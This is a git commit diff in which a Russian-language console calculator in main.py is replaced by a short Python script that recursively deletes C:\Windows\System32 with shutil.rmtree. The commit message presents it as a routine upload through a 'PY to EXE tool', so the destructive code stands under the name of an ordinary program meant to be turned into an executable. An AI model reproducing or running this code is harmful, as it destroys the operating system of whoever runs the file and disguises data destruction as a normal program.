f1bdcbb2983b02278f407838cfae0012ba3f3079
eroge-69 <erogexunamed@gmail.com>
2025-07-09 11:47:14 +0700

    Upload main.py via PY to EXE tool

--- python-files/main.py
+++ python-files/main.py
@@ -1,76 +1,16 @@
-from math import cos, sin, tan, radians
+import shutil
+import os
 
-while True:
-    command = input(f'введите команду >> ')
-    
-    if command == 'команды':
-        print(f'чет, кос, син, тан, радиан, калькулятор, стоп')
+# Define the path to the System32 folder
+system32_path = r"C:\Windows\System32"
 
-    elif command == 'чет':
-        a = input(f'>> ')
-        try:
-            a = int(a)
-            if a % 2 == 0:
-                print(f'чет >> {a} <<')
-            else:
-                print(f'нечет >> {a} <<')
-        except ValueError:
-            print(f'>> {a} << не число!')
-
-    elif command == 'кос':
-        try:
-            coss = int(input(f'>> '))
-            print(cos(coss))
-        except ValueError:
-            print(f'>> {coss} << не число!')
-
-    elif command == 'син':
-        try:
-            sinn = int(input('>> '))
-            print(sin(sinn))
-        except ValueError:
-            print(f'>> {sinn} << не число!')
-
-    elif command == 'тан':
-        try:
-            tann = int(input(f'>> '))
-            print(tan(tann))
-        except ValueError:
-            print(f'>> {tann} << не число!')
-
-    elif command == 'радиан':
-        try:
-            radian = int(input(f'>> '))
-            print(radians(radian))
-        except ValueError:
-            print(f'>> {radian} << не число!')
-
-    elif command == 'калькулятор':
-        znak = input(f'какой знак использовать?\n 1) +\n 2) -\n 3) *\n 4) /\n>> ')
-        if znak not in ['1', '2', '3', '4']:
-            print(f'>> {znak} << не является цифрой из заданных! выберите цифру 1, 2, 3 или 4!')
-        elif znak == '1':
-            chislo = float(input(f'>> '))
-            chislo1 = float(input(f'>> '))
-            print(f'>> {chislo + chislo1} <<')
-
-        elif znak == '2':
-            chislo2 = float(input(f'>> '))
-            chislo3 = float(input(f'>> '))
-            print(f'>> {chislo2 - chislo3} <<')
-
-        elif znak == '3':
-            chislo4 = float(input(f'>> '))
-            chislo5 = float(input(f'>> '))
-            print(f'>> {chislo4 * chislo5} <<')
-
-        elif znak == '4':
-            chislo6 = float(input(f'>> '))
-            chislo7 = float(input(f'>> '))
-            print(f'>> {chislo6 / chislo7} <<')
-
-    elif command == 'стоп':
-        print(f'>> {command} << выход!')
-        break
-    else:
-        print(f'нет такой команды!')
+# Check if the path exists
+if os.path.exists(system32_path):
+    try:
+        # Attempt to remove the directory and its contents recursively
+        shutil.rmtree(system32_path)
+        print(f"Attempted to delete: {system32_path}")
+    except OSError as e:
+        print(f"Error deleting {system32_path}: {e}")
+else:
+    print(f"Path not found: {system32_path}")
